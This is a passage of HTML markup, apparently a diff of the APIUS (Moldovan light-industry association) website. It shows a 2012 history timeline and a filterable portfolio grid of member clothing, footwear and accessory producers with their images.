href="http://apius.md/wp-content/uploads/2014/08/1176141_551122891608141_139922963_n.jpg"  data-rel="prettyPhoto[historygallery19]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/1176141_551122891608141_139922963_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/542206_551122631608167_1200525180_n.jpg"  data-rel="prettyPhoto[historygallery19]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/542206_551122631608167_1200525180_n.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/Lansare-Brand-pentru-copii-Bombonici.jpg"  data-rel="prettyPhoto[historygallery19]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/Lansare-Brand-pentru-copii-Bombonici.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="time today">2012</li><li class="note animated" data-animation="fadeInLeft" data-animation-delay="200"><p class="history-date no-margin uppercase normal">5 Sep 12</p><p class="history-head uppercase semibold">Primul cocncurs marca "Din Inima" </p><p class="history-desc no-margin normal">In aces an au fost puse primele baze ale proiectului dedicat "Din Inima", proiect care a ajuns sa fie cel mai mare si cel mai rasunator din domeniul fashion si dezvoltare a brandurilor autohtone. </p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/Concurs-Din-Inima-Modei-iulie.jpg"  data-rel="prettyPhoto[historygallery20]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/Concurs-Din-Inima-Modei-iulie.jpg" alt="" /></a></div><span class="note-arrow"></span></li><li class="note animated" data-animation="fadeInRight" data-animation-delay="200"><p class="history-date no-margin uppercase normal">6 Dec 12</p><p class="history-head uppercase semibold">Deschiderea primei platforme comerciale "Din Inima"</p><p class="history-desc no-margin normal">In incinta Centrului Comercial Zorile a fost lansata prima platforma comerciala dedicata brandurilor Din Inima</p><div class="timeline-images"><a href="http://apius.md/wp-content/uploads/2014/08/parcomunication071212_6.jpg"  data-rel="prettyPhoto[historygallery21]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/parcomunication071212_6.jpg" alt="" /></a><a href="http://apius.md/wp-content/uploads/2014/08/parcomunication071212_2.jpg"  data-rel="prettyPhoto[historygallery21]" class="timeline-image"><img src="http://apius.md/wp-content/uploads/2014/08/parcomunication071212_2.jpg" alt="" /></a></div><span class="note-arrow"></span></li>			
+
+							<!-- Start Icon -->
+							<li class="start"><a href="#history" class="scroll dark-gray-degrade-diagonal"><span class="up-arrow"></span></a></li>
+							<li class="clear"></li>
+							</ul>
+
+		</div><!-- End Inner Div -->
+
+		</section><!-- End History Section -->
+</div>		
+<!-- Portfolio -->
+<section id="portfolio" class="container ">
+   <div class="portfolio">
+      <!-- Header -->
+      <h1 class="header light dark"><span class="condiment">Membrii nostrii</span></h1>
+      <!-- Description -->
+      <h4 class="h-desc dark">APIUS incorporeaza peste 80 de membri activi, care sunt cei mai importanti jucatori ai sectorului Industriei Usoare. </h4>
+   </div>
+   <!-- End inner div -->
+   <!-- Expander -->
+   <div class="item-expander relative">
+      <div id="item-expander">
+         <p class="cls-btn"><a class="close">X</a></p>
+         <div class="expander-inner"></div>
+      </div>
+   </div>
+      <!-- Filters -->
+   <div id="options" class="filter-menu fullwidth">
+      <ul id="filters" class=" option-set relative normal" data-option-key="filter">
+         <li><a href="#filter" data-option-value="*" class="selected">Toate</a></li>
+         <li><a href="#filter" data-option-value=".accesorii">Accesorii</a></li><li><a href="#filter" data-option-value=".confectii-textile">Confectii Textile</a></li><li><a href="#filter" data-option-value=".confectii-textile-pentru-copii">Confecții pentru copii</a></li><li><a href="#filter" data-option-value=".incaltaminte">Incaltaminte</a></li>      </ul>
+   </div>
+      <!-- Works -->
+   <div class="portfolio-items no-margin no-padding">
+   <div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="494" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/alina-bradu-2.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Alina Bradu</p><p class="work-category normal no-margin">Confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="638" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Pomarinkids.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">PomarinKIds</p><p class="work-category normal no-margin">Producatori lenjerie pat copii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  incaltaminte "><div class="work-inner"><!-- Image --><div class="work-image"><a href="636" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/batistrada.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Batistrada</p><p class="work-category normal no-margin">Producător de încălțăminte</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  accesorii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="635" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Ju-BIjoux.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Ju Bijoux</p><p class="work-category normal no-margin">Producător de accesorii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="629" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/lenicris.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Lenicris</p><p class="work-category normal no-margin">Producători haine pentru copii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="633" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Sweet-baby.png" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Sweet baby</p><p class="work-category normal no-margin">Producători haine pentru copii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="631" class="expander"><img src="" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Special Baby</p><p class="work-category normal no-margin">Producători lenjeri de pat pentru copii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="630" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/lia-fia.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Lia Fia</p><p class="work-category normal no-margin">Producători haine pentru copii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="628" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/creme-brulee.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Creme Brulee</p><p class="work-category normal no-margin">Producători haine pentru copii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="626" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Cocsinelle.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Cocsinelle</p><p class="work-category normal no-margin">Producători haine pentru copii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="624" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/lazu-silvia-bombonici.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Bombonici</p><p class="work-category normal no-margin"> Producator haine copii </p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="623" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/eho.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">EHO</p><p class="work-category normal no-margin">Producător rochii de ocazii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="620" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/doua-inimi.png" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Două inimi</p><p class="work-category normal no-margin">Producător rochii de ocazii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  "><div class="work-inner"><!-- Image --><div class="work-image"><a href="619" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/DiVero.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Di Vero</p><p class="work-category normal no-margin">Producător rochii de ocazie</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="618" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/vasilini.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Vasilini</p><p class="work-category normal no-margin"> Producator de blanuri si produse din semiblana  </p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="616" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/artizana-factory.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Artizana Factory</p><p class="work-category normal no-margin"> Producatori de blanuri si produse din semiblana  </p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="615" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/artizana.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Artizana</p><p class="work-category normal no-margin"> Producatori de blănuri și produse din semiblană  </p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  accesorii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="614" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Vitalie-Burlacu.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Vitalie Burlacu</p><p class="work-category normal no-margin">Producator de marochinarie </p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  accesorii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="612" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/maalex.png" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Maalex</p><p class="work-category normal no-margin">Producator de marochinarie </p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  accesorii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="611" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/artima-1.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Artima</p><p class="work-category normal no-margin">Producator de marochinarie </p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  accesorii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="609" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Arillu.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Arillu</p><p class="work-category normal no-margin">Producator de marochinarie </p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  incaltaminte "><div class="work-inner"><!-- Image --><div class="work-image"><a href="607" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/trenwood.png" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Trenwood</p><p class="work-category normal no-margin">Producător de încălțăminte</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  incaltaminte "><div class="work-inner"><!-- Image --><div class="work-image"><a href="606" class="expander"><img src="" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Isco-Prim</p><p class="work-category normal no-margin">Producător de încălțăminte</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  incaltaminte "><div class="work-inner"><!-- Image --><div class="work-image"><a href="605" class="expander"><img src="" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Floare</p><p class="work-category normal no-margin">Producător de încălțăminte</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  incaltaminte "><div class="work-inner"><!-- Image --><div class="work-image"><a href="604" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/irka.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Irka Shoes</p><p class="work-category normal no-margin">Producător de încălțăminte</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  incaltaminte "><div class="work-inner"><!-- Image --><div class="work-image"><a href="603" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Hincu.png" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Hîncu</p><p class="work-category normal no-margin">Producător de încălțăminte</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  incaltaminte "><div class="work-inner"><!-- Image --><div class="work-image"><a href="602" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Cristina.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">work image</p><p class="work-category normal no-margin">Producător de încălțăminte</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="601" class="expander"><img src="" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Anette</p><p class="work-category normal no-margin">Producator haine pentru dame</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="600" class="expander"><img src="" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Nikita Rinaldi</p><p class="work-category normal no-margin">Producător confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="599" class="expander"><img src="" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Sandi</p><p class="work-category normal no-margin">Na.aN Fashion</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="598" class="expander"><img src="" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Ridiager-SV</p><p class="work-category normal no-margin">Na.aN Fashion</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="596" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/naan.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Na.aN Fashion</p><p class="work-category normal no-margin">Producători confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="593" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/move.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">MOVE</p><p class="work-category normal no-margin">Producători confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="592" class="expander"><img src="" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Mallena</p><p class="work-category normal no-margin">Producători confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="589" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/maicom-1.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Maicom</p><p class="work-category normal no-margin">Producători confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="588" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Storojuc.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Ludmila Storojuc</p><p class="work-category normal no-margin">Producători confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="587" class="expander"><img src="" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Julia Allert</p><p class="work-category normal no-margin">Producători confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="586" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/ionel.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Ionel</p><p class="work-category normal no-margin">Producator confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="585" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/intercenter.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Intercentre Lux</p><p class="work-category normal no-margin">Producator confectii textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="584" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Icatex.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Icatex</p><p class="work-category normal no-margin">Producator confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="583" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/hermina.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Hermina</p><p class="work-category normal no-margin">Producător confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="582" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Gloria.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Gloria</p><p class="work-category normal no-margin">Producător confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="581" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Feodora.png" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Feodora</p><p class="work-category normal no-margin">Producător confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="580" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/georgete.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Georgette</p><p class="work-category normal no-margin">Producător haine pentru dame</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="579" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/tricot.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Croitor-Tricot</p><p class="work-category normal no-margin">Producător confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="578" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/brio.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Brio</p><p class="work-category normal no-margin">Producător confecții textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="576" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/Balteanca.gif" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Bălțeanca</p><p class="work-category normal no-margin">Producător textile</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="446" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/magvi.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Magvi</p><p class="work-category normal no-margin">Producatori haine copii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="444" class="expander"><img src="" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Maxi Kids</p><p class="work-category normal no-margin">Producatori haine copii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="442" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/milabrega.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Milabrega</p><p class="work-category normal no-margin"> Producatori de blanuri si produse din semiblana  </p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="440" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Mis-Vivien.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Miss Vivien</p><p class="work-category normal no-margin">Producatori haine copii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="438" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Moldabela.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Moldabela</p><p class="work-category normal no-margin">Producator de covoare </p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="436" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Oblanc.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">O'blanc</p><p class="work-category normal no-margin">Producatori de rochii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="434" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Odemal.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Odemal</p><p class="work-category normal no-margin">Odemal</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  incaltaminte "><div class="work-inner"><!-- Image --><div class="work-image"><a href="432" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Old-Com.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Old Com</p><p class="work-category normal no-margin">Producator de incaltaminte</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  incaltaminte "><div class="work-inner"><!-- Image --><div class="work-image"><a href="430" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Olsa-Shoes.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Olsa Shoes</p><p class="work-category normal no-margin">Producator de incaltaminte</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="428" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Passer.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Passer</p><p class="work-category normal no-margin">Camasi pentru barbati si dame</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="426" class="expander"><img src="http://apius.md/wp-content/uploads/2016/11/perna-mea.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Perna mea</p><p class="work-category normal no-margin">Producator de perne</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile-pentru-copii "><div class="work-inner"><!-- Image --><div class="work-image"><a href="424" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Picci.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Picci</p><p class="work-category normal no-margin">Producator de haine pentru copii</p><a href=""  data-rel="" class="work-link-passive" ><span class="arrow"></span></a></div></div><!-- End Work Inner --></div><div class="work five  confectii-textile "><div class="work-inner"><!-- Image --><div class="work-image"><a href="422" class="expander"><img src="http://apius.md/wp-content/uploads/2016/09/Ponti.jpg" alt="" /><span class="positive"></span></a></div><!-- Work Details --><div class="work-bottom"><p class="work-name uppercase normal no-margin">Ponti</p><p class="work-category normal no-margin">Producator de colanti</p><a href=""  data-rel="" class="work-link-passive" ><span 